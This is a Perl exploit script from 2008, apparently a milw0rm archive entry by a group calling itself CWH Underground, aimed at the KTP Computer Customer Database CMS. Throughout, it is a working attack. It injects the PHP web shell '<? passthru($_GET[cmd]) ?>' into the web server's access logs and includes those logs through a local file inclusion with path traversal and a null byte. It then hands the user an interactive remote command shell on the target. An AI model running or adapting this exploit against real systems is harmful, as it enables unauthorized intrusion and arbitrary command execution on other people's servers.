#!/usr/bin/perl -w
#======================================
# KTPCCD Local File Inclusion Exploit
#======================================
#
#  ,--^----------,--------,-----,-------^--,
#  |  |||||||||   `--------'    |	   O	  .. CWH Underground Hacking Team ..
#  `+---------------------------^----------|
#   `\_,-------, _________________________|
#      / XXXXXX /`|     /
#     / XXXXXX /  `\   /
#    / XXXXXX /\______(
#   / XXXXXX /           
#  / XXXXXX /
# (________(             
#  `------'
#
#AUTHOR : CWH Underground
#DATE : 30 November 2008
#SITE : cwh.citec.us
#
#
#####################################################
#APPLICATION : KTP Computer Customer Database CMS
#VERSION : 1
#DOWNLOAD : http://downloads.sourceforge.net/ktpcomputercust/ktp_build_20081119.zip
######################################################
#Note: magic_quotes_gpc = off
#Vulnerability in Local File Inclusion
#Wrote Exploit for Local File Inclusion <-> Remote Command Execution
#######################################################################################
#Greetz      : ZeQ3uL, BAD $ectors, Snapter, Conan, JabAv0C, Win7dos, Gdiupo, GnuKDE, JK
#Special Thx : asylu3, str0ke, citec.us, milw0rm.com
#######################################################################################


use LWP::UserAgent;
use IO::Socket;
use LWP::Simple;

$log="../";
@apache=(
"../../../../../var/log/httpd/access_log",
"../../../../../var/log/httpd/error_log",
"../apache/logs/error.log",
"../apache/logs/access.log",
"../../apache/logs/error.log",
"../../apache/logs/access.log",
"../../../apache/logs/error.log",
"../../../apache/logs/access.log",
"../../../../apache/logs/error.log",
"../../../../apache/logs/access.log",
"../../../../../apache/logs/error.log",
"../../../../../apache/logs/access.log",
"../logs/error.log",
"../logs/access.log",
"../../logs/error.log",
"../../logs/access.log",
"../../../logs/error.log",
"../../../logs/access.log",
"../../../../logs/error.log",
"../../../../logs/access.log",
"../../../../../logs/error.log",
"../../../../../logs/access.log",
"../../../../../etc/httpd/logs/access_log",
"../../../../../etc/httpd/logs/access.log",
"../../../../../etc/httpd/logs/error_log",
"../../../../../etc/httpd/logs/error.log",
"../../.. /../../var/www/logs/access_log",
"../../../../../var/www/logs/access.log",
"../../../../../usr/local/apache/logs/access_log",
"../../../../../usr/local/apache/logs/access.log",
"../../../../../var/log/apache/access_log",
"../../../../../var/log/apache/access.log",
"../../../../../var/log/access_log",
"../../../../../var/www/logs/error_log",
"../../../../../var/www/logs/error.log",
"../../../../../usr/local/apache/logs/error_log",
"../../../../../usr/local/apache/logs/error.log",
"../../../../../var/log/apache/error_log",
"../../../../../var/log/apache/error.log",
"../../../../../var/log/access_log",
"../../../../../var/log/error_log"
);

my $sis="$^O";if ($sis eq 'MSWin32') { system("cls"); } else { system("clear"); }

print "\n==============================================\n";
print "     KTP Computer Customer Database \n";
print "    Remote Command Execution Exploit \n";
print "      Discovered By CWH Underground \n";
print "==============================================\n";
print " \n";
print " ,--^----------,--------,-----,-------^--, \n";
print " | ||||||||| `--------' | O \n";
print " `+---------------------------^----------| \n";
print " `\_,-------, _________________________| \n";
print " / XXXXXX /`| / \n";
print " / XXXXXX / `\ / \n";
print " / XXXXXX /\______( \n";
print " / XXXXXX / \n";
print " / XXXXXX / .. CWH Underground Hacking Team .. \n";
print " (________( \n";
print " `------' \n";
print " \n";



if (@ARGV < 2)
{
    print "Usage: ./xpl.pl <Host> <Path>\n";
	print "Ex. ./xpl.pl www.hackme.com /ktp\n";

}

$host=$ARGV[0];
$path=$ARGV[1];


if ( $host   =~   /^http:/ ) {$host =~ s/http:\/\///g;}

print "\nTrying to Inject the Code...\n";

$CODE="<? passthru(\$_GET[cmd]) ?>";
$socket = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>"$host", PeerPort=>"80") or die "Could not connect to host.\n\n";
print $socket "GET /cwhunderground ".$CODE." HTTP/1.1\r\n";
print $socket "Host: ".$host."\r\n";
print $socket "Connection: close\r\n\r\n";
close($socket);

if ( $host   !~   /^http:/ ) {$host = "http://" . $host;}

 foreach $getlog(@apache)
                {
                  chomp($getlog);
				  $find= $host.$path."/?p=".$getlog."%00";
                  $xpl = LWP::UserAgent->new() or die "Could not initialize browser\n";
				  $req = HTTP::Request->new(GET => $find);
				  $res = $xpl->request($req);
				  $info = $res->content;
                  if($info =~ /cwhunderground/)
                    {print "\nSuccessfully injected in $getlog \n";$log=$getlog;}
                }


my $sis="$^O";if ($sis eq 'MSWin32') { print "\n[cmd\@win32]\$ "; } else { print "\n[cmd\@unix]\$ "; }

chomp( $cmd = <STDIN> );

while($cmd !~ "exit") {   
   
				  $shell= $host.$path."/?p=".$log."%00&cmd=$cmd";
                  $xpl = LWP::UserAgent->new() or die "Could not initialize browser\n";
				  $req = HTTP::Request->new(GET => $shell);
				  $res = $xpl->request($req);
				  $info = $res->content;
				  print "\n$info";

   
    my $sis="$^O";if ($sis eq 'MSWin32') { print "\n[cmd\@win32]\$ "; } else { print "\n[cmd\@unix]\$ "; }
    chomp( $cmd = <STDIN> );   
}

# milw0rm.com [2008-11-30]
